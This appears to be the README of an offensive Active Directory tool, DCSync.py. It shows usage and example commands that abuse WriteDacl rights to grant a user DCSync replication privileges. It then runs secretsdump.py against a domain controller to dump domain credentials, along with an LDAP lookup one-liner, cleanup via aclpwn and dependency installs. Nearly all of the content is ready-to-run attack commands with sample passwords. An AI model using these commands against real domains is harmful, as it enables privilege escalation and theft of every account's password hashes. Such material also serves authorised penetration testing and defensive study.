# Adding DCSync Permissions
Mostly copypasta from https://github.com/tothi/rbcd-attack
```
usage: DCSync.py [-h] -dc FQDN -t USERNAME [-hashes LMHASH:NTHASH] [-k] identity

WriteDacl Attack: To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges.

positional arguments:
  identity              domain\username:password, attacker account with write access to target computer properties (NetBIOS domain name must be used!)

options:
  -h, --help            show this help message and exit
  -dc FQDN              FQDN of the Domain Controller
  -t USERNAME           Target user to be escalated in format *Distinguished Names*
  -hashes LMHASH:NTHASH
                        Hash for LDAP auth (instead of password)
  -k                    If you want to use a Kerberos ticket

 Examples:
     dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00py\Administrator:Password123
     dcsync.py -dc dc01.n00py.local -t 'CN=n00py,OU=Employees,DC=n00py,DC=local'  n00py\Administrator -k
     dcsync.py -dc dc01.n00py.local -t 'CN=spoNge369,CN=Users,DC=n00py,DC=local' 'n00py.local\user_with_writeDACL:P@$$w0rd123'

 DCSync Attack:
     secretsdump.py 'n00py.local/spoNge369:passw0rd123!@dc01.n00py.local'

 Search Distinguished Names(DN) of spoNge369:
     pywerview get-netuser -u'any_valid_user' -p'password321$' -t dc01.n00py.local | perl -wnlE'print if/distinguishedname.+spoNge369/'
  
```

To clean up after you are done, use ACLpwn https://github.com/fox-it/aclpwn.py. This tool is pretty old and not maintained, but you can get it to work. One thing you will need to do is replace “neo4j.v1” with just “neo4j” in database.py. To restore the ACLs to the original configuration, use the restore state file created by the DCSync tool.




## Dependencies:

Impacket <br>
`pip3 install pywerview`

For kerberos:
```
apt install heimdal-dev -y
apt install libkrb5-dev -y
python3 -m pip install gssapi
```
